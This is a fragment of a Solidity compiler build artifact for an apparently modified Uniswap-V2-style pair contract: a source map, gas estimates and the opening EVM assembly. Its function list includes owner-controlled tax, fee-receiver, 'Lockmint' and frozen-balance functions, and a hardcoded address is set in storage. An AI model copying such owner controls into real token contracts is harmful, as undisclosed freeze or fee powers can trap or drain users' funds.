;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;30:3:-1;22:6;14;1:33;99:1;93:3;85:6;81:16;74:27;137:4;133:9;126:4;121:3;117:14;113:30;106:37;;169:3;161:6;157:16;147:26;;13126:200:6;;;;;;;;;;;;;;;;;;;;;;8:9:-1;5:2;;;30:1;27;20:12;5:2;13126:200:6;;;;8:9:-1;5:2;;;45:16;42:1;39;24:38;77:16;74:1;67:27;5:2;13126:200:6;;;;13089:237;13341:9;13377:3;13367:6;;13354:10;:19;13353:27;;;;;;13341:39;;13394:9;13430:3;13420:6;;13407:10;:19;13406:27;;;;;;;-1:-1:-1;13452:14:6;;13448:60;;13491:10;;13468:40;;13482:7;;-1:-1:-1;;;;;13491:10:6;13503:4;13468:13;:40::i;:::-;13560:14;;13556:60;;13599:10;;13576:40;;13590:7;;-1:-1:-1;;;;;13599:10:6;13611:4;13576:13;:40::i;:::-;13675;;;-1:-1:-1;;;13675:40:6;;13709:4;13675:40;;;;;;-1:-1:-1;;;;;13675:25:6;;;;;:40;;;;;;;;;;;;;;:25;:40;;;5:2:-1;;;;30:1;27;20:12;5:2;13675:40:6;;;;8:9:-1;5:2;;;45:16;42:1;39;24:38;77:16;74:1;67:27;5:2;13675:40:6;;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;-1:-1;13675:40:6;13740;;;-1:-1:-1;;;13740:40:6;;13774:4;13740:40;;;;;;13675;;-1:-1:-1;;;;;;13740:25:6;;;;;:40;;;;;13675;;13740;;;;;;;;:25;:40;;;5:2:-1;;;;30:1;27;20:12;5:2;13740:40:6;;;;8:9:-1;5:2;;;45:16;42:1;39;24:38;77:16;74:1;67:27;5:2;13740:40:6;;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;-1:-1;13740:40:6;;-1:-1:-1;13800:14:6;;-1:-1:-1;;;;;;;;;;;13828:22:6;;;;;13817:33;;:99;;13915:1;13817:99;;;13889:10;13877:9;-1:-1:-1;;;;;13877:22:6;;13865:8;:35;13817:99;13800:116;;13926:14;13966:10;13954:9;-1:-1:-1;;;;;13954:22:6;;13943:8;:33;:99;;14041:1;13943:99;;;14015:10;14003:9;-1:-1:-1;;;;;14003:22:6;;13991:8;:35;13943:99;13926:116;;14085:1;14073:9;:13;:30;;;;14102:1;14090:9;:13;14073:30;14052:111;;;;-1:-1:-1;;;14052:111:6;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;14263:21;14305:42;14329:17;:9;14343:2;14329:17;:13;:17;:::i;:::-;14305:19;:8;14318:5;14305:19;:12;:19;:::i;:::-;:23;:42;:23;:42;:::i;:::-;14263:98;-1:-1:-1;14375:21:6;14417:42;14441:17;:9;14455:2;14441:17;:13;:17;:::i;14417:42::-;14375:98;-1:-1:-1;14574:46:6;14609:10;14574:30;-1:-1:-1;;;;;14574:15:6;;;;:30;;;:19;:30;:::i;:::-;:34;:46;:34;:46;:::i;:::-;14512:38;:16;14533;14512:38;:20;:38;:::i;:::-;:108;;14487:177;;;;;-1:-1:-1;;;14487:177:6;;;;;;;;;;;;-1:-1:-1;;;14487:177:6;;;;;;;;;;;;;;;1270:1;;14685:49;14693:8;14703;14713:9;14724;14685:7;:49::i;:::-;14749:66;;;;;;;;;;;;;;;;;;;;;;;;;;-1:-1:-1;;;;;14749:66:6;;;14754:10;;14749:66;;;;;;;;;-1:-1:-1;;1292:1:6;1281:8;:12;-1:-1:-1;;;;;;;;;11956:2866:6:o;175:39:0:-;;;;;;;;;;;;;;-1:-1:-1;;;175:39:0;;;;:::o;1607:301:6:-;1813:8;;-1:-1:-1;;;;;1813:8:6;;;;-1:-1:-1;;;1843:8:6;;;;;;-1:-1:-1;;;1883:18:6;;;;;1607:301::o;2810:147:0:-;2877:4;2893:36;2902:10;2914:7;2923:5;2893:8;:36::i;:::-;-1:-1:-1;2946:4:0;2810:147;;;;;:::o;587:21:6:-;;;-1:-1:-1;;;;;587:21:6;;:::o;2834:274::-;2973:7;;-1:-1:-1;;;;;2973:7:6;2959:10;:21;2951:52;;;;;-1:-1:-1;;;2951:52:6;;;;;;;;;;;;-1:-1:-1;;;2951:52:6;;;;;;;;;;;;;;;3033:6;:16;;-1:-1:-1;;;;;3033:16:6;;;-1:-1:-1;;;;;;3033:16:6;;;;;;;3059:6;:16;;;;;;;;;;;;;;;3085:6;:16;2834:274::o;307:26:0:-;;;;:::o;3108:361::-;-1:-1:-1;;;;;3239:15:0;;3219:4;3239:15;;;:9;:15;;;;;;;;3255:10;3239:27;;;;;;;;-1:-1:-1;;3239:42:0;3235:171;;-1:-1:-1;;;;;3327:15:0;;;;;;:9;:15;;;;;;;;3343:10;3327:27;;;;;;;;:68;;3376:5;3327:68;:31;:68;:::i;:::-;-1:-1:-1;;;;;3297:15:0;;;;;;:9;:15;;;;;;;;3313:10;3297:27;;;;;;;:98;3235:171;3415:26;3425:4;3431:2;3435:5;3415:9;:26::i;:::-;-1:-1:-1;3458:4:0;3108:361;;;;;:::o;656:116::-;706:66;656:116;:::o;266:35::-;299:2;266:35;:::o;515:31::-;;;;:::o;459:49::-;;;;;;;;;;;;;:::o;934:32:6:-;;;;:::o;972:::-;;;;:::o;1482:117::-;1415:5;;-1:-1:-1;;;;;1415:5:6;1401:10;:19;1393:65;;;;-1:-1:-1;;;1393:65:6;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;1545:6;:16;1482:117::o;5261:1265::-;5310:14;1205:8;;1217:1;1205:13;1197:41;;;;;-1:-1:-1;;;1197:41:6;;;;;;;;;;;;-1:-1:-1;;;1197:41:6;;;;;;;;;;;;;;;1259:1;1248:8;:12;;;1259:1;5379:13;:11;:13::i;:::-;-1:-1:-1;5440:6:6;;5433:39;;;-1:-1:-1;;;5433:39:6;;5466:4;5433:39;;;;;;5336:56;;-1:-1:-1;5336:56:6;;-1:-1:-1;5417:13:6;;-1:-1:-1;;;;;5440:6:6;;;;5433:24;;:39;;;;;;;;;;;;;;5440:6;5433:39;;;5:2:-1;;;;30:1;27;20:12;5:2;5433:39:6;;;;8:9:-1;5:2;;;45:16;42:1;39;24:38;77:16;74:1;67:27;5:2;5433:39:6;;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;-1:-1;5433:39:6;5505:6;;5498:39;;;-1:-1:-1;;;5498:39:6;;5531:4;5498:39;;;;;;5433;;-1:-1:-1;5482:13:6;;-1:-1:-1;;;;;5505:6:6;;;;5498:24;;:39;;;;;5433;;5498;;;;;;;;5505:6;5498:39;;;5:2:-1;;;;30:1;27;20:12;5:2;5498:39:6;;;;8:9:-1;5:2;;;45:16;42:1;39;24:38;77:16;74:1;67:27;5:2;5498:39:6;;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;-1:-1;5498:39:6;;-1:-1:-1;5547:12:6;5562:23;:8;-1:-1:-1;;;;;5562:23:6;;;:12;:23;:::i;:::-;5547:38;-1:-1:-1;5595:12:6;5610:23;:8;-1:-1:-1;;;;;5610:23:6;;;:12;:23;:::i;:::-;5595:38;;5644:10;5657:30;5666:9;5677;5657:8;:30::i;:::-;5697:17;5717:11;5644:43;;-1:-1:-1;5820:17:6;5816:394;;5865:54;443:7;5865:31;5875:20;:7;5887;5875:20;:11;:20;:::i;:::-;5865:9;:31::i;:54::-;5853:66;;5933:36;5947:1;443:7;5933:5;:36::i;:::-;5816:394;;;6067:132;-1:-1:-1;;;;;6093:37:6;;:25;:7;6105:12;6093:25;:11;:25;:::i;:::-;:37;;;;;;-1:-1:-1;;;;;6148:37:6;;:25;:7;6160:12;6148:25;:11;:25;:::i;:::-;:37;;;;;;6067:8;:132::i;:::-;6055:144;;5816:394;6239:1;6227:9;:13;6219:64;;;;-1:-1:-1;;;6219:64:6;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;6293:20;6299:2;6303:9;6293:5;:20::i;:::-;6324:49;6332:8;6342;6352:9;6363;6324:7;:49::i;:::-;6387:5;6383:47;;;6421:8;;6402:28;;-1:-1:-1;;;;;6407:8:6;;;;-1:-1:-1;;;6421:8:6;;;6402:28;:18;:28;:::i;:::-;6394:5;:36;6383:47;6485:34;;;;;;;;;;;;;;6490:10;;6485:34;;;;;;;;-1:-1:-1;;1292:1:6;1281:8;:12;-1:-1:-1;5261:1265:6;;;-1:-1:-1;;;;;;5261:1265:6:o;339:44:0:-;;;;;;;;;;;;;:::o;1010:17:6:-;;;;:::o;778:41:0:-;;;;;;;;;;;;;:::o;8025:1429:6:-;8088:12;8102;1205:8;;1217:1;1205:13;1197:41;;;;;-1:-1:-1;;;1197:41:6;;;;;;;;;;;;-1:-1:-1;;;1197:41:6;;;;;;;;;;;;;;;1259:1;1248:8;:12;;;1259:1;8169:13;:11;:13::i;:::-;-1:-1:-1;8225:6:6;;8274;;8321:40;;;-1:-1:-1;;;8321:40:6;;8355:4;8321:40;;;;;;8126:56;;-1:-1:-1;8126:56:6;;-1:-1:-1;;;;;;8225:6:6;;;;8274;;;8207:15;;8225:6;;8321:25;;:40;;;;;;;;;;;;;;8225:6;8321:40;;;5:2:-1;;;;30:1;27;20:12;5:2;8321:40:6;;;;8:9:-1;5:2;;;45:16;42:1;39;24:38;77:16;74:1;67:27;5:2;8321:40:6;;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;-1:-1;8321:40:6;8387;;;-1:-1:-1;;;8387:40:6;;8421:4;8387:40;;;;;;8321;;-1:-1:-1;8371:13:6;;-1:-1:-1;;;;;8387:25:6;;;;;:40;;;;;8321;;8387;;;;;;;:25;:40;;;5:2:-1;;;;30:1;27;20:12;5:2;8387:40:6;;;;8:9:-1;5:2;;;45:16;42:1;39;24:38;77:16;74:1;67:27;5:2;8387:40:6;;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;-1:-1;8387:40:6;8472:4;8437:14;8454:24;;;:9;8387:40;8454:24;;;;;8387:40;;-1:-1:-1;8502:30:6;8511:9;8522;8502:8;:30::i;:::-;8542:17;8562:11;8489:43;;-1:-1:-1;8562:11:6;8671:23;:9;8685:8;8671:23;:13;:23;:::i;:::-;:38;;;;;;;-1:-1:-1;8803:12:6;8777:23;:9;8791:8;8777:23;:13;:23;:::i;:::-;:38;;;;;;8767:48;;8904:1;8894:7;:11;:26;;;;;8919:1;8909:7;:11;8894:26;8873:111;;;;-1:-1:-1;;;8873:111:6;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;8994:31;9008:4;9015:9;8994:5;:31::i;:::-;9035:35;9049:7;9058:2;9062:7;9035:13;:35::i;:::-;9080;9094:7;9103:2;9107:7;9080:13;:35::i;:::-;9136:40;;;-1:-1:-1;;;9136:40:6;;9170:4;9136:40;;;;;;-1:-1:-1;;;;;9136:25:6;;;;;:40;;;;;;;;;;;;;;:25;:40;;;5:2:-1;;;;30:1;27;20:12;5:2;9136:40:6;;;;8:9:-1;5:2;;;45:16;42:1;39;24:38;77:16;74:1;67:27;5:2;9136:40:6;;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;-1:-1;9136:40:6;9197;;;-1:-1:-1;;;9197:40:6;;9231:4;9197:40;;;;;;9136;;-1:-1:-1;;;;;;9197:25:6;;;;;:40;;;;;9136;;9197;;;;;;;;:25;:40;;;5:2:-1;;;;30:1;27;20:12;5:2;9197:40:6;;;;8:9:-1;5:2;;;45:16;42:1;39;24:38;77:16;74:1;67:27;5:2;9197:40:6;;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;-1:-1;9197:40:6;;-1:-1:-1;9248:49:6;9256:8;9197:40;9276:9;9287;9248:7;:49::i;:::-;9311:5;9307:47;;;9345:8;;9326:28;;-1:-1:-1;;;;;9331:8:6;;;;-1:-1:-1;;;9345:8:6;;;9326:28;:18;:28;:::i;:::-;9318:5;:36;9307:47;9409:38;;;;;;;;;;;;;;-1:-1:-1;;;;;9409:38:6;;;9414:10;;9409:38;;;;;;;;;;;1270:1;;;;;;;;;1292;1281:8;:12;;;;8025:1429;;;:::o;1114:20::-;;;-1:-1:-1;;;;;1114:20:6;;:::o;325:70::-;;;-1:-1:-1;;;;;325:70:6;;:::o;220:40:0:-;;;;;;;;;;;;;;-1:-1:-1;;;220:40:0;;;;:::o;2963:139::-;3026:4;3042:32;3052:10;3064:2;3068:5;3042:9;:32::i;402:48:6:-;443:7;402:48;:::o;18077:421::-;1205:8;;1217:1;1205:13;1197:41;;;;;-1:-1:-1;;;1197:41:6;;;;;;;;;;;;-1:-1:-1;;;1197:41:6;;;;;;;;;;;;;;;1259:1;1248:8;:12;18145:6;;18194;;18334:8;;18289:40;;;-1:-1:-1;;;18289:40:6;;18323:4;18289:40;;;;;;-1:-1:-1;;;;;18145:6:6;;;;18194;;;;18225:128;;18145:6;;18273:2;;18289:54;;-1:-1:-1;;;;;18334:8:6;;18145:6;;18289:25;;:40;;;;;;;;;;;;;;;18145:6;18289:40;;;5:2:-1;;;;30:1;27;20:12;5:2;18289:40:6;;;;8:9:-1;5:2;;;45:16;42:1;39;24:38;77:16;74:1;67:27;5:2;18289:40:6;;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;-1:-1;18289:40:6;;:54;:44;:54;:::i;:::-;18225:13;:128::i;:::-;18472:8;;18427:40;;;-1:-1:-1;;;18427:40:6;;18461:4;18427:40;;;;;;18363:128;;18390:7;;18411:2;;18427:54;;-1:-1:-1;;;18472:8:6;;-1:-1:-1;;;;;18472:8:6;;-1:-1:-1;;;;;18427:25:6;;;;;:40;;;;;;;;;;;;;;;:25;:40;;;5:2:-1;;;;30:1;27;20:12;18363:128:6;-1:-1:-1;;1292:1:6;1281:8;:12;-1:-1:-1;18077:421:6:o;559:22::-;;;-1:-1:-1;;;;;559:22:6;;:::o;614:21::-;;;-1:-1:-1;;;;;614:21:6;;:::o;3475:964:0:-;3688:15;3676:8;:27;;3668:56;;;;;-1:-1:-1;;;3668:56:0;;;;;;;;;;;;-1:-1:-1;;;3668:56:0;;;;;;;;;;;;;;;3836:16;;-1:-1:-1;;;;;4073:13:0;;;3734:14;4073:13;;;:6;:13;;;;;;;;:15;;;;;;;;;3901:243;;706:66;3901:243;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;26:21:-1;;;22:32;;;6:49;;3901:243:0;;;;;3870:292;;;;;;-1:-1:-1;;;3774:402:0;;;;;;;;;;;;;;;;;;;;;26:21:-1;;;22:32;;;6:49;;3774:402:0;;;;;;3751:435;;;;;;;;;4223:26;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;3734:14;;4073:15;4223:26;;;;;-1:-1:-1;;4223:26:0;;;;;;;;;;4073:15;4223:26;;;8:9:-1;5:2;;;45:16;42:1;39;24:38;77:16;74:1;67:27;5:2;-1:-1;;4223:26:0;;-1:-1:-1;;4223:26:0;;;-1:-1:-1;;;;;;;4280:30:0;;;;;;:59;;;4334:5;-1:-1:-1;;;;;4314:25:0;:16;-1:-1:-1;;;;;4314:25:0;;4280:59;4259:132;;;;;-1:-1:-1;;;4259:132:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;4401:31;4410:5;4417:7;4426:5;4401:8;:31::i;:::-;3475:964;;;;;;;;;:::o;6635:1281:6:-;6688:14;1205:8;;1217:1;1205:13;1197:41;;;;;-1:-1:-1;;;1197:41:6;;;;;;;;;;;;-1:-1:-1;;;1197:41:6;;;;;;;;;;;;;;;1259:1;1248:8;:12;;;1259:1;6757:13;:11;:13::i;:::-;-1:-1:-1;6818:6:6;;6811:39;;;-1:-1:-1;;;6811:39:6;;6844:4;6811:39;;;;;;6714:56;;-1:-1:-1;6714:56:6;;-1:-1:-1;6795:13:6;;-1:-1:-1;;;;;6818:6:6;;;;6811:24;;:39;;;;;;;;;;;;;;6818:6;6811:39;;;5:2:-1;;;;30:1;27;20:12;5:2;6811:39:6;;;;8:9:-1;5:2;;;45:16;42:1;39;24:38;77:16;74:1;67:27;5:2;6811:39:6;;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;-1:-1;6811:39:6;6883:6;;6876:39;;;-1:-1:-1;;;6876:39:6;;6909:4;6876:39;;;;;;6811;;-1:-1:-1;6860:13:6;;-1:-1:-1;;;;;6883:6:6;;;;6876:24;;:39;;;;;6811;;6876;;;;;;;;6883:6;6876:39;;;5:2:-1;;;;30:1;27;20:12;5:2;6876:39:6;;;;8:9:-1;5:2;;;45:16;42:1;39;24:38;77:16;74:1;67:27;5:2;6876:39:6;;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;-1:-1;6876:39:6;;-1:-1:-1;6925:12:6;6940:23;:8;-1:-1:-1;;;;;6940:23:6;;;:12;:23;:::i;:::-;6925:38;-1:-1:-1;6973:12:6;6988:23;:8;-1:-1:-1;;;;;6988:23:6;;;:12;:23;:::i;:::-;6973:38;;7022:10;7035:30;7044:9;7055;7035:8;:30::i;:::-;7075:17;7095:11;7022:43;;-1:-1:-1;7198:17:6;7194:399;;7243:54;443:7;7243:31;7253:20;:7;7265;7253:20;:11;:20;:::i;7243:54::-;7231:66;;7311:41;7330:1;443:7;7311:10;:41::i;:::-;;7194:399;;;7450:132;-1:-1:-1;;;;;7476:37:6;;:25;:7;7488:12;7476:25;:11;:25;:::i;7450:132::-;7438:144;;7194:399;7622:1;7610:9;:13;7602:66;;;;-1:-1:-1;;;7602:66:6;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;7678:25;7689:2;7693:9;7678:10;:25::i;:::-;;7714:49;7722:8;7732;7742:9;7753;7714:7;:49::i;389:64:0:-;;;;;;;;;;;;;;;;;;;;;;;;:::o;641:18:6:-;;;;:::o;18544:214::-;1205:8;;1217:1;1205:13;1197:41;;;;;-1:-1:-1;;;1197:41:6;;;;;;;;;;;;-1:-1:-1;;;1197:41:6;;;;;;;;;;;;;;;1259:1;1248:8;:12;18612:6;;18605:39;;;-1:-1:-1;;;18605:39:6;;18638:4;18605:39;;;;;;18584:167;;-1:-1:-1;;;;;18612:6:6;;18605:24;;:39;;;;;;;;;;;;;;18612:6;18605:39;;;5:2:-1;;;;30:1;27;20:12;5:2;18605:39:6;;;;8:9:-1;5:2;;;45:16;42:1;39;24:38;77:16;74:1;67:27;5:2;18605:39:6;;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;-1:-1;18605:39:6;18665:6;;18658:39;;;-1:-1:-1;;;18658:39:6;;18691:4;18658:39;;;;;;-1:-1:-1;;;;;18665:6:6;;;;18658:24;;:39;;;;;18605;;18658;;;;;;;;18665:6;18658:39;;;5:2:-1;;;;30:1;27;20:12;5:2;18658:39:6;;;;8:9:-1;5:2;;;45:16;42:1;39;24:38;77:16;74:1;67:27;5:2;18658:39:6;;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;-1:-1;18658:39:6;18711:8;;-1:-1:-1;;;;;18711:8:6;;;;-1:-1:-1;;;18733:8:6;;;18584:7;:167::i;:::-;1292:1;1281:8;:12;18544:214::o;1914:338::-;516:34;;;;;;;;;;;;;;;;;2054:43;;-1:-1:-1;;;;;2054:43:6;;;;;;;;;;;;;;;;26:21:-1;;;22:32;;;6:49;;2054:43:6;;;;;;25:18:-1;;;61:17;;-1:-1;;;;;182:15;-1:-1;;;179:29;160:49;;2030:77:6;;;;1995:12;;2009:17;;2030:10;;;2054:43;2030:77;;;25:18:-1;2030:77:6;;25:18:-1;36:153;66:2;61:3;58:11;36:153;;176:10;;164:23;;-1:-1;;139:12;;;;98:2;89:12;;;;114;36:153;;;274:1;267:3;263:2;259:12;254:3;250:22;246:30;315:4;311:9;305:3;299:10;295:26;356:4;350:3;344:10;340:21;389:7;380;377:20;372:3;365:33;3:399;;;2030:77:6;;;;;;;;;;;;;;;;;;;;;;;;14:1:-1;21;16:31;;;;75:4;69:11;64:16;;144:4;140:9;133:4;115:16;111:27;107:43;104:1;100:51;94:4;87:65;169:16;166:1;159:27;225:16;222:1;215:4;212:1;208:12;193:49;7:242;;16:31;36:4;31:9;;7:242;;1994:113:6;;;;2138:7;:57;;;;-1:-1:-1;2150:11:6;;:16;;:44;;;2181:4;2170:24;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;-1:-1;2170:24:6;2150:44;2117:128;;;;;-1:-1:-1;;;2117:128:6;;;;;;;;;;;;;;;;;;;;;;;;;;;;1914:338;;;;;:::o;481:149:7:-;539:9;568:6;;;:30;;-1:-1:-1;;583:5:7;;;597:1;592;583:5;592:1;578:15;;;;;:20;568:30;560:63;;;;;-1:-1:-1;;;560:63:7;;;;;;;;;;;;-1:-1:-1;;;560:63:7;;;;;;;;;;;;;;339:136;431:5;;;426:16;;;;418:50;;;;;-1:-1:-1;;;418:50:7;;;;;;;;;;;;-1:-1:-1;;;418:50:7;;;;;;;;;;;;;;3190:983:6;-1:-1:-1;;;;;3352:23:6;;;;;:50;;-1:-1:-1;;;;;;3379:23:6;;;3352:50;3331:114;;;;;-1:-1:-1;;;3331:114:6;;;;;;;;;;;;-1:-1:-1;;;3331:114:6;;;;;;;;;;;;;;;3560:18;;3486:25;:15;:25;;;-1:-1:-1;;;3560:18:6;;;;3543:35;;;3615:15;;;;;;:33;;-1:-1:-1;;;;;;3634:14:6;;;;3615:33;:51;;;;-1:-1:-1;;;;;;3652:14:6;;;;3615:51;3611:396;;;3851:11;3782:80;;3787:44;3821:9;3787:27;3804:9;3787:16;:27::i;:::-;-1:-1:-1;;;;;3787:33:6;;:44;:33;:44;:::i;:::-;3742:20;:120;;-1:-1:-1;;;;;3782:50:6;;;;:80;;;;3742:120;;;3916:80;;;3921:44;3955:9;3921:27;3938:9;3921:16;:27::i;:44::-;3876:20;:120;;-1:-1:-1;;;;;3916:50:6;;;;:80;;;;3876:120;;;3611:396;4016:8;:28;;-1:-1:-1;;4016:28:6;-1:-1:-1;;;;;4016:28:6;;;;;;;-1:-1:-1;;;;4054:28:6;-1:-1:-1;;;4054:28:6;;;;;;;;;-1:-1:-1;;;;;4092:35:6;-1:-1:-1;;;4092:35:6;;;;;;;;;4142:24;;;4147:8;;;4142:24;;4157:8;;;;;;;4142:24;;;;;;;;;;;;;;;;;3190:983;;;;;;:::o;2410:169:0:-;-1:-1:-1;;;;;2493:16:0;;;;;;;:9;:16;;;;;;;;:25;;;;;;;;;;;;;:33;;;2541:31;;;;;;;;;;;;;;;;;2410:169;;;:::o;2585:219::-;-1:-1:-1;;;;;2681:15:0;;;;;;:9;:15;;;;;;:26;;2701:5;2681:26;:19;:26;:::i;:::-;-1:-1:-1;;;;;2663:15:0;;;;;;;:9;:15;;;;;;:44;;;;2733:13;;;;;;;:24;;2751:5;2733:24;:17;:24;:::i;:::-;-1:-1:-1;;;;;2717:13:0;;;;;;;:9;:13;;;;;;;;;:40;;;;2772:25;;;;;;;2717:13;;2772:25;;;;-1:-1:-1;;;;;;;;;;;2772:25:0;;;;;;;;2585:219;;;:::o;4259:893:6:-;4354:10;4376:13;4401:7;;;;;;;;;-1:-1:-1;;;;;4401:7:6;-1:-1:-1;;;;;4392:23:6;;:25;;;;;;;;;;;;;;;;;;;;;;8:9:-1;5:2;;;30:1;27;20:12;5:2;4392:25:6;;;;8:9:-1;5:2;;;45:16;42:1;39;24:38;77:16;74:1;67:27;5:2;4392:25:6;;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;-1:-1;4392:25:6;4478:5;;-1:-1:-1;;;;;4435:19:6;;;;;;-1:-1:-1;4392:25:6;;-1:-1:-1;4478:5:6;4508:638;;4537:11;;4533:546;;4568:10;4581:41;4591:30;-1:-1:-1;;;;;4591:15:6;;;;:30;;;:19;:30;:::i;4581:41::-;4568:54;;4640:14;4657:17;4667:6;4657:9;:17::i;:::-;4640:34;;4704:9;4696:5;:17;4692:373;;;4737:14;4754:90;4821:1;4754:37;4770:20;:5;4780:9;4770:20;:9;:20;:::i;:::-;4754:11;;;:37;:15;:37;:::i;:90::-;4737:107;-1:-1:-1;4866:16:6;4885:35;4903:16;:9;4917:1;4903:16;:13;:16;:::i;:::-;4885:13;:5;4895:2;4885:13;:9;:13;:::i;:::-;:17;:35;:17;:35;:::i;:::-;4866:54;;4942:14;4971:11;4959:9;:23;;;;;;;-1:-1:-1;5008:13:6;;5004:42;;5023:23;5029:5;5036:9;5023:5;:23::i;:::-;4692:373;;;;4533:546;;;4508:638;;;5099:11;;5095:51;;5134:1;5126:5;:9;5095:51;4259:893;;;;;;:::o;352:301:5:-;400:9;429:1;425;:5;421:226;;;-1:-1:-1;450:1:5;485;481;477:5;;:9;500:89;511:1;507;:5;500:89;;;536:1;532:5;;573:1;568;564;560;:5;;;;;;:9;559:15;;;;;;555:19;;500:89;;;421:226;;;;609:6;;605:42;;-1:-1:-1;635:1:5;605:42;352:301;;;:::o;1508:200:0:-;1583:11;;:22;;1599:5;1583:22;:15;:22;:::i;:::-;1569:11;:36;;;-1:-1:-1;;;;;1631:13:0;;;;:9;:13;;;;;;:24;;1649:5;1631:24;:17;:24;:::i;:::-;-1:-1:-1;;;;;1615:13:0;;;;;;:9;:13;;;;;;;;:40;;;;1670:31;;;;;;;1615:13;;;;-1:-1:-1;;;;;;;;;;;1670:31:0;;;;;;;;;1508:200;;:::o;134:103:5:-;192:9;221:1;217;:5;:13;;229:1;217:13;;;225:1;217:13;213:17;134:103;-1:-1:-1;;;134:103:5:o;2196:208:0:-;-1:-1:-1;;;;;2277:15:0;;;;;;:9;:15;;;;;;:26;;2297:5;2277:26;:19;:26;:::i;:::-;-1:-1:-1;;;;;2259:15:0;;;;;;:9;:15;;;;;:44;;;;2327:11;:22;;2343:5;2327:22;:15;:22;:::i;:::-;2313:11;:36;;;2364:33;;;;;;;;-1:-1:-1;;;;;2364:33:0;;;-1:-1:-1;;;;;;;;;;;2364:33:0;;;;;;;;;2196:208;;:::o;1714:476::-;1807:4;-1:-1:-1;;;;;1869:21:0;;1861:65;;;;;-1:-1:-1;;;1861:65:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;2016:11;;:23;;2032:6;2016:23;:15;:23;:::i;:::-;2002:11;:37;;;-1:-1:-1;;;;;2075:23:0;;;;:14;:23;;;;;;:35;;2103:6;2075:35;:27;:35;:::i;:::-;-1:-1:-1;;;;;2049:23:0;;;;;;:14;:23;;;;;;;;:61;;;;2125:37;;;;;;;2049:23;;;;-1:-1:-1;;;;;;;;;;;2125:37:0;;;;;;;;;-1:-1:-1;2179:4:0;1714:476;;;;:::o;321:118:8:-;-1:-1:-1;;;;;396:10:8;-1:-1:-1;;;396:17:8;;321:118::o;507:106::-;567:9;-1:-1:-1;;;;;596:10:8;;-1:-1:-1;;;;;592:14:8;;596:10;592:14;;;;;;507:106;-1:-1:-1;;;507:106:8:o;198:135:7:-;290:5;;;285:16;;;;277:49;;;;;-1:-1:-1;;;277:49:7;;;;;;;;;;;;-1:-1:-1;;;277:49:7;;;;;;;;;;;;;"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "2037400",
								"executionCost": "infinite",
								"totalCost": "infinite"
							},
							"external": {
								"DOMAIN_SEPARATOR()": "1088",
								"FeeResiver()": "1104",
								"Lockmint(address)": "infinite",
								"MINIMUM_LIQUIDITY()": "243",
								"PERMIT_TYPEHASH()": "244",
								"_frozenBalance(address)": "1236",
								"allowance(address,address)": "1305",
								"approve(address,uint256)": "22433",
								"balanceOf(address)": "1170",
								"burn(address)": "infinite",
								"decimals()": "275",
								"factory()": "1126",
								"getReserves()": "1240",
								"initialize(address,address,uint256)": "62865",
								"kLast()": "1066",
								"mint(address)": "infinite",
								"name()": "infinite",
								"nonces(address)": "1214",
								"owner()": "1082",
								"permit(address,address,uint256,uint256,uint8,bytes32,bytes32)": "infinite",
								"price0CumulativeLast()": "1043",
								"price1CumulativeLast()": "1065",
								"skim(address)": "infinite",
								"swap(uint256,uint256,address,bytes)": "infinite",
								"symbol()": "infinite",
								"sync()": "infinite",
								"taxfee()": "1108",
								"taxfeeupdate(uint256)": "infinite",
								"token0()": "1083",
								"token1()": "1148",
								"totalSupply()": "1088",
								"transfer(address,uint256)": "infinite",
								"transferFrom(address,address,uint256)": "infinite"
							},
							"internal": {
								"_mintFee(uint112,uint112)": "infinite",
								"_safeTransfer(address,address,uint256)": "infinite",
								"_update(uint256,uint256,uint112,uint112)": "infinite"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 226,
									"end": 18760,
									"name": "PUSH",
									"value": "80"
								},
								{
									"begin": 226,
									"end": 18760,
									"name": "PUSH",
									"value": "40"
								},
								{
									"begin": 226,
									"end": 18760,
									"name": "MSTORE"
								},
								{
									"begin": 325,
									"end": 395,
									"name": "PUSH",
									"value": "6"
								},
								{
									"begin": 325,
									"end": 395,
									"name": "DUP1"
								},
								{
									"begin": 325,
									"end": 395,
									"name": "SLOAD"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "PUSH",
									"value": "1"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "PUSH",
									"value": "1"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "PUSH",
									"value": "A0"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "SHL"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "SUB"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "NOT"
								},
								{
									"begin": 325,
									"end": 395,
									"name": "AND"
								},
								{
									"begin": 353,
									"end": 395,
									"name": "PUSH",
									"value": "9E94EE69F3CDCD5E74E05563736E4679DA6DB44C"
								},
								{
									"begin": 325,
									"end": 395,
									"name": "OR"
								},
								{
									"begin": 325,
									"end": 395,
									"name": "SWAP1"
